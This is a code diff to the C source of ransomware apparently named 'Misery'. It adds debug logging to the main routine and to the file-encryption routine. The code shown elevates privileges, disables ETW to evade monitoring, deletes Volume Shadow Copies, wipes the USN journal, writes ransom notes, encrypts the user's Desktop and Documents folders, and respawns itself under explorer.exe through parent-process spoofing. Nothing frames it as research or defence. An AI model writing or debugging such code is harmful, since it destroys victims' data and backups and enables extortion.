@@ -229,21 +229,48 @@ void EncryptTargets() {
     XOR_DECRYPT_TO(str_desktop, desktop_local, xor_key);
     XOR_DECRYPT_TO(str_documents, documents_local, xor_key);
     
+    printf("[*] Getting desktop path...\n"); fflush(stdout);
     HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
-    if (FAILED(hr)) strncpy(desktop_path, (char*)desktop_local, sizeof(desktop_path)-1);
+    if (FAILED(hr)) {
+        printf("[!] SHGetFolderPath FAILED for desktop, using fallback\n"); fflush(stdout);
+        strncpy(desktop_path, (char*)desktop_local, sizeof(desktop_path)-1);
+    } else {
+        printf("[+] Desktop path: %s\n", desktop_path); fflush(stdout);
+    }
     
+    printf("[*] Getting documents path...\n"); fflush(stdout);
     hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docs_path);
-    if (FAILED(hr)) strncpy(docs_path, (char*)documents_local, sizeof(docs_path)-1);
+    if (FAILED(hr)) {
+        printf("[!] SHGetFolderPath FAILED for docs, using fallback\n"); fflush(stdout);
+        strncpy(docs_path, (char*)documents_local, sizeof(docs_path)-1);
+    } else {
+        printf("[+] Documents path: %s\n", docs_path); fflush(stdout);
+    }
     
-    if (!InitFileOps(8)) return;
+    printf("[*] Initializing file operations with 8 threads...\n"); fflush(stdout);
+    if (!InitFileOps(8)) {
+        printf("[ERROR] InitFileOps(8) FAILED - this is likely the problem!\n"); fflush(stdout);
+        return;
+    }
+    printf("[+] FileOps initialized\n"); fflush(stdout);
     
+    printf("[*] Writing ransom note to desktop...\n"); fflush(stdout);
     WriteADSRansom(desktop_path);
-    EncryptDirectory(desktop_path);
     
+    printf("[*] Encrypting desktop folder: %s\n", desktop_path); fflush(stdout);
+    int encrypted_desktop = EncryptDirectory(desktop_path);
+    printf("[+] Desktop encryption done: %d files processed\n", encrypted_desktop); fflush(stdout);
+    
+    printf("[*] Writing ransom note to documents...\n"); fflush(stdout);
     WriteADSRansom(docs_path);
-    EncryptDirectory(docs_path);
     
+    printf("[*] Encrypting documents folder: %s\n", docs_path); fflush(stdout);
+    int encrypted_docs = EncryptDirectory(docs_path);
+    printf("[+] Documents encryption done: %d files processed\n", encrypted_docs); fflush(stdout);
+    
+    printf("[*] Cleaning up file operations...\n"); fflush(stdout);
     CleanupFileOps();
+    printf("[+] Cleanup complete\n"); fflush(stdout);
 }
 
 // ===================== GET EXPLORER PID =====================
@@ -268,34 +295,77 @@ DWORD GetExplorerPID() {
 
 // ===================== MAIN =====================
 int main() {
-    /* FIX: Call privilege escalation early */
+    printf("\n========== MISERY DEBUG START ==========\n"); fflush(stdout);
+    printf("[*] Misery started\n"); fflush(stdout);
+    
+    printf("[*] Elevating privileges...\n"); fflush(stdout);
     ElevatePrivileges();
+    printf("[+] Privileges elevated\n"); fflush(stdout);
     
+    printf("[*] Initializing syscalls...\n"); fflush(stdout);
     InitSyscalls();
+    printf("[+] Syscalls initialized\n"); fflush(stdout);
     
+    printf("[*] Disabling ETW...\n"); fflush(stdout);
     DisableETW();
+    printf("[+] ETW disabled\n"); fflush(stdout);
+    
+    printf("[*] Setting IO priority...\n"); fflush(stdout);
     SetIOPriorityHigh();
+    printf("[+] IO priority set\n"); fflush(stdout);
     
-    /* FIX: Initialize indirect syscall framework */
+    printf("[*] Initializing all syscalls...\n"); fflush(stdout);
     InitAllSyscalls();
+    printf("[+] All syscalls initialized\n"); fflush(stdout);
     
-    /*  Initialize crypto  */
-    if (InitCrypto("Thejahanzaib@1318", 22) != CRYPTO_SUCCESS || !VerifyContext() || !GetCryptoCtx()) {
+    printf("[*] Initializing crypto with password...\n"); fflush(stdout);
+    if (InitCrypto("Thejahanzaib@1318", 22) != CRYPTO_SUCCESS) {
+        printf("[ERROR] Crypto init FAILED!\n"); fflush(stdout);
         return 1;
     }
+    printf("[+] Crypto initialized\n"); fflush(stdout);
     
+    printf("[*] Verifying crypto context...\n"); fflush(stdout);
+    if (!VerifyContext()) {
+        printf("[ERROR] VerifyContext FAILED!\n"); fflush(stdout);
+        return 1;
+    }
+    printf("[+] Crypto context verified\n"); fflush(stdout);
+    
+    printf("[*] Getting crypto context...\n"); fflush(stdout);
+    if (!GetCryptoCtx()) {
+        printf("[ERROR] GetCryptoCtx FAILED!\n"); fflush(stdout);
+        return 1;
+    }
+    printf("[+] Got crypto context\n"); fflush(stdout);
+    
+    printf("[*] Deleting VSS...\n"); fflush(stdout);
     DeleteVSS();
-    WipeUSNJournal();   // resolves to utils.c's WipeUSNJournal
+    printf("[+] VSS deleted\n"); fflush(stdout);
     
+    printf("[*] Wiping USN journal...\n"); fflush(stdout);
+    WipeUSNJournal();
+    printf("[+] USN journal wiped\n"); fflush(stdout);
+    
+    printf("[*] Encrypting targets...\n"); fflush(stdout);
     EncryptTargets();
+    printf("[+] Encryption targets complete\n"); fflush(stdout);
     
+    printf("[*] Getting explorer PID...\n"); fflush(stdout);
     DWORD explorer_pid = GetExplorerPID();
+    printf("[+] Explorer PID: %lu\n", explorer_pid); fflush(stdout);
+    
     if (explorer_pid) {
-        /* FIX: Use correct binary path - build should output to build/misery.exe */
         char misery_path[MAX_PATH];
         GetModuleFileNameA(NULL, misery_path, MAX_PATH);
+        printf("[*] Spawning process from path: %s\n", misery_path); fflush(stdout);
         SpawnWithPPID(misery_path, explorer_pid);
+        printf("[+] Process spawned\n"); fflush(stdout);
+    } else {
+        printf("[!] No explorer.exe found, skipping PPID spoofing\n"); fflush(stdout);
     }
     
+    printf("[+] Misery completed successfully!\n"); fflush(stdout);
+    printf("========== MISERY DEBUG END ==========\n\n"); fflush(stdout);
     return 0;
 }
